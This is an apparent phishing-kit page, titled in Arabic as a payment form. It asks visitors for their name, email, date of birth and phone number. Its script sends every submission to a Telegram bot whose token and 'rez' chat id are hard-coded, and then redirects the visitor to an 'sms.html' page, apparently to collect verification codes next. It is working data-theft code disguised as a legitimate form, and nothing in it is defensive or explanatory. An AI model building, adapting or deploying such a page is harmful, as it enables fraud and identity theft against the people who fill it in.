<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>نماذج الدفع - Telegram JS</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
body { font-family: 'Poppins', sans-serif; background:#f4f7fb; padding:20px; }
.card { max-width:800px; margin:auto; padding:20px; border-radius:10px; box-shadow:0 8px 30px rgba(18,38,63,0.08); }
.status-ok {color:#155724;background:#d4edda;padding:12px;border-radius:8px; margin-bottom:15px;}
.status-fail {color:#721c24;background:#f8d7da;padding:12px;border-radius:8px; margin-bottom:15px;}
</style>
</head>
<body>

<div class="card">
    <h3>إدخال بيانات الدفع</h3>
    <form id="paymentForm">
        <div class="mb-2">
            <label>الاسم الأول</label>
            <input class="form-control" type="text" name="first_name" required>
        </div>
        <div class="mb-2">
            <label>اسم العائلة</label>
            <input class="form-control" type="text" name="last_name">
        </div>
        <div class="mb-2">
            <label>البريد الإلكتروني</label>
            <input class="form-control" type="email" name="email" required>
        </div>
        <div class="mb-2">
            <label>تاريخ الميلاد</label>
            <input class="form-control" type="date" name="dob">
        </div>
        <div class="mb-2">
            <label>رقم الهاتف</label>
            <input class="form-control" type="tel" name="num">
        </div>
        <button type="submit" class="btn btn-primary mt-2">إرسال</button>
    </form>

    <div id="resultArea" style="display:none;">
        <div id="statusMsg"></div>
        <p>سيتم تحويلك تلقائياً إلى صفحة <strong>SMS</strong> بعد <span id="countdown">3</span> ثواني</p>
    </div>
</div>

<script>
// إعدادات config JS
const CONFIG = {
    telegram: {
        send: true,
        bot_token: "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcU18QM",
        rez_chat: "-4982276528"
    },
    redirect_sms: "sms.html",
    delay_seconds: 3
};

// التعامل مع الفورم
document.getElementById("paymentForm").addEventListener("submit", function(e){
    e.preventDefault();
    const form = e.target;
    const data = {};
    new FormData(form).forEach((v,k) => data[k]=v);

    // عرض area النتيجة
    document.getElementById("resultArea").style.display = "block";

    if(CONFIG.telegram.send){
        const message = Object.entries(data).map(([k,v]) => `${k}: ${v}`).join("\n");
        fetch(`https://api.telegram.org/bot${CONFIG.telegram.bot_token}/sendMessage`, {
            method: "POST",
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({chat_id: CONFIG.telegram.rez_chat, text: message})
        })
        .then(res => res.json())
        .then(resp => {
            if(resp.ok){
                document.getElementById("statusMsg").innerHTML = '<div class="status-ok">✅ تم الإرسال بنجاح إلى Telegram</div>';
                startRedirect();
            } else {
                document.getElementById("statusMsg").innerHTML = '<div class="status-fail">❌ فشل الإرسال</div>';
            }
        })
        .catch(err=>{
            document.getElementById("statusMsg").innerHTML = '<div class="status-fail">❌ حدث خطأ أثناء الإرسال</div>';
            console.error(err);
        });
    }
});

// عدّاد تحويل تلقائي
function startRedirect(){
    let delay = CONFIG.delay_seconds;
    const cdEl = document.getElementById("countdown");
    cdEl.textContent = delay;
    const interval = setInterval(()=>{
        delay--;
        cdEl.textContent = delay;
        if(delay <= 0){
            clearInterval(interval);
            window.location.href = CONFIG.redirect_sms;
        }
    },1000);
}
</script>

</body>
</html>
